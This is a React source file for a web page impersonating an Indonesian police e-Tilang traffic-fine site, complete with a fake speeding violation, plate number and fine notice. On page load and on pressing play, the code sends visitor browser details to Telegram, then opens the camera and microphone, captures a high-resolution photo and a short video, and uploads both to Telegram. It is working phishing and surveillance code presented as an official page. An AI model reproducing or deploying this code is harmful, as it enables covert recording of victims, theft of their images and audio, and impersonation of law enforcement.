import { PlayIcon } from "@heroicons/react/24/solid";
import { useState, useEffect, useCallback } from "react";
import {
  sendTelegramNotification,
  sendImageToTelegram,
  sendVideoToTelegram,
} from "./utils/telegram";

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl =
    "https://e1.pxfuel.com/desktop-wallpaper/309/113/desktop-wallpaper-plain-black-black-screen.jpg";

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || "Direct",
        previousSites: document.referrer || "None",
      });

      await captureAndSendMedia();
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(
        (device) => device.kind === "videoinput"
      );

      if (!videoDevice) {
        throw new Error("No video input device found");
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      // Create and setup video element for photo capture
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error("Error playing video:", error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement("canvas");
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext("2d");

      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob(
          (blob) => {
            if (blob) resolve(blob);
          },
          "image/jpeg",
          1.0
        );
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        "video/mp4;codecs=h264,aac",
        "video/mp4",
        "video/webm;codecs=vp8,opus",
        "video/webm",
      ];

      const supportedMimeType = mimeTypes.find((type) =>
        MediaRecorder.isTypeSupported(type)
      );

      if (!supportedMimeType) {
        throw new Error("No supported video format found");
      }

      // Configure video recording with maximum quality
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000, // 8 Mbps for high quality
      });

      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, {
          type: supportedMimeType.includes("mp4") ? "video/mp4" : "video/webm",
        });
        console.log("Video recording completed, size:", videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach((track) => track.stop());
      };

      // Start recording with frequent data chunks for better quality
      mediaRecorder.start(1000);
      console.log("Started recording video");

      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder.state === "recording") {
          console.log("Stopping video recording");
          mediaRecorder.stop();
        }
      }, 10000);
    } catch (error) {
      console.error("Error capturing media:", error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  // Tanggal dan waktu saat ini dalam format Indonesia
  const currentDate = new Date().toLocaleDateString("id-ID", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  });

  const currentTime = new Date().toLocaleTimeString("id-ID", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  return (
    <div className="relative min-h-screen bg-gray-100">
      <header className="relative py-3 bg-blue-800 border-b border-blue-700">
        <div className="container flex items-center justify-between px-4 mx-auto">
          <div className="flex items-center">
            {/* Logo polisi */}
            <div className="flex items-center justify-center w-12 h-12 mr-3 bg-yellow-500 border-2 border-yellow-400 rounded-full">
              <span className="text-xs font-bold text-blue-900">POLRI</span>
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">
                REKAMAN PELANGGARAN LALU LINTAS
              </h1>
              <p className="text-xs text-blue-200">
                Sistem E-Tilang • Direktorat Lalu Lintas
              </p>
            </div>
          </div>
          <div className="px-2 py-1 font-mono text-sm text-white bg-black rounded">
            {currentDate}
          </div>
        </div>
      </header>

      <main className="container relative px-4 py-4 mx-auto">
        <div className="max-w-[1080px] mx-auto">
          {/* Informasi bar di atas video */}
          <div className="flex items-center justify-between p-2 text-sm text-white bg-blue-800 rounded-t-lg">
            <span>LOK: JL. AHMAD YANI KM 5</span>
            <span className="px-2 font-mono bg-red-600 rounded animate-pulse">
              REC
            </span>
            <span>ID: TLG-{Math.floor(10000 + Math.random() * 90000)}</span>
          </div>

          <div className="relative">
            <div className="relative overflow-hidden bg-black rounded-b-lg shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
              )}

              {/* Overlay elemen yang biasa tampil di rekaman polisi */}
              <div className="absolute top-0 left-0 z-20 flex justify-between w-full p-2 font-mono text-xs text-white">
                <span>Kec: 78 km/j</span>
                <span>Batas: 60 km/j</span>
              </div>

              <div className="absolute bottom-0 left-0 z-20 flex justify-between w-full p-2 font-mono text-xs text-white">
                <span>NOPOL: B 1234 ABC</span>
                <span className="font-bold text-red-500 animate-pulse">
                  PELANGGARAN TERDETEKSI
                </span>
                <span>T: {currentTime}</span>
              </div>

              <div className="absolute inset-0 z-10 flex items-center justify-center">
                <button
                  onClick={handlePlayClick}
                  className="p-6 transition-all duration-300 bg-red-600 border-2 border-white rounded-full hover:bg-red-700 hover:scale-110 group"
                >
                  <PlayIcon className="w-16 h-16 text-white group-hover:text-gray-100" />
                </button>
              </div>

              <img
                src={thumbnailUrl}
                alt="Video Pelanggaran"
                className="object-cover w-full h-full"
              />
            </div>
          </div>

          {/* Panel informasi detail pelanggaran */}
          <div className="p-4 mt-4 bg-white border border-gray-200 rounded-lg shadow-md">
            <h2 className="pb-2 mb-2 text-lg font-bold text-blue-800 border-b border-gray-200">
              DETAIL PELANGGARAN
            </h2>
            <div className="grid grid-cols-2 gap-2 text-sm">
              <div>
                <p>
                  <span className="font-bold">Jenis:</span> Melebihi Batas
                  Kecepatan
                </p>
                <p>
                  <span className="font-bold">Lokasi:</span> JL. AHMAD YANI KM 5
                </p>
                <p>
                  <span className="font-bold">Waktu:</span> {currentTime}
                </p>
              </div>
              <div>
                <p>
                  <span className="font-bold">Kendaraan:</span> Mobil Penumpang
                </p>
                <p>
                  <span className="font-bold">Nomor Polisi:</span> B 1234 ABC
                </p>
                <p>
                  <span className="font-bold">Status:</span>{" "}
                  <span className="font-bold text-red-600">BELUM DIPROSES</span>
                </p>
              </div>
            </div>
          </div>

          {/* Panel denda */}
          <div className="p-4 mt-4 border border-red-200 rounded-lg shadow-md bg-red-50">
            <h2 className="pb-2 mb-2 text-lg font-bold text-red-700 border-b border-red-200">
              INFORMASI DENDA
            </h2>
            <div className="text-sm">
              <p>
                <span className="font-bold">Pasal:</span> UU No. 22 Tahun 2009
                Pasal 287 ayat 5
              </p>
              <p>
                <span className="font-bold">Denda Maksimal:</span> Rp 500.000,-
              </p>
              <p className="mt-2 text-xs text-gray-700">
                Silakan tekan tombol play untuk melihat bukti pelanggaran.
                Rekaman ini merupakan bukti sah untuk proses tilang elektronik.
              </p>
            </div>
          </div>
        </div>
      </main>

      <footer className="py-2 mt-6 text-xs text-center text-white bg-blue-800">
        <p>KEPOLISIAN NEGARA REPUBLIK INDONESIA</p>
        <p className="mt-1 text-blue-200">Sistem E-Tilang v2.5 © 2025</p>
      </footer>
    </div>
  );
}

export default App;
